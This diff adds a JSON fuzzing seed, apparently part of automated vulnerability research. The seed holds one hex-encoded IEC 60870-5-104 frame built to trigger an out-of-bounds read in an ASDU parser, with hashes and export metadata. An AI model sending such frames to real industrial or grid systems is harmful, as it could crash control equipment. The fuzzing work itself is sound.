@@ -1,0 +1,54 @@
+{
+  "plan_id": "",
+  "seed_id": "vk-rev-200-seq1",
+  "title": "VK-only issue 200 parser-depth sequence-form ASDU OOB trigger",
+  "strategy": "parser_depth",
+  "target_operation": "short sequence-form ASDU acceptance with OOB IOA read",
+  "purpose": "Issue-guided sequence using model-prior sequence ASDU structure to hit InformationObject_ParseObjectAddress OOB while preserving state prerequisite",
+  "evidence_ids": [
+    "issue:200:200-summary:348db1f37fe8"
+  ],
+  "messages": [
+    {
+      "index": 0,
+      "direction": "client_to_server",
+      "label": "I-frame with short sequence M_SP_NA_1 (VSQ=2 claimed, 2-byte CA)",
+      "hex": "68100a000000000000008301000001000000",
+      "byte_length": 18,
+      "sha256": "7b19c974390e25491bc48ab3596941c2724c7a68c4115026bc4b5ea5d36d31f5"
+    }
+  ],
+  "expected_behavior": "Server accepts short ASDU; parser reaches OOB read on getElement sequence iteration (safe analogue to reported crash without copied payloads)",
+  "constraints_preserved": [
+    "FT1.2/IEC 60870-5-104 APCI framing",
+    "0x68 L octet consistent with frame size",
+    "Diversified link/control/interrogation/measurement paths",
+    "Lowercase hex no separators",
+    "Internally consistent lengths"
+  ],
+  "issue_safety_notes": "Safe analogue only; no exact crash bytes from any issue; enforces family constraints and model-prior structure",
+  "sequence_sha256": "c5a12bc1cb2d4eb05b3e6003892939f681f5f7e208596acf58ccc3745645e6cb",
+  "total_bytes": 18,
+  "message_count_hint": 1,
+  "repair_notes": [
+    "recomputed CS104 APCI length"
+  ],
+  "exact_issue_collision": false,
+  "plan_issue_refs": [],
+  "_selection_score": 112.0,
+  "export": {
+    "sequence_encoding": "raw-binary-concat",
+    "sequence_file": "sequence.bin",
+    "encoded_sha256": "7b19c974390e25491bc48ab3596941c2724c7a68c4115026bc4b5ea5d36d31f5",
+    "encoded_bytes": 18,
+    "frames": [
+      {
+        "message_index": 0,
+        "frame_offset": 0,
+        "payload_offset": 0,
+        "payload_length": 18,
+        "frame_length": 18
+      }
+    ]
+  }
+}
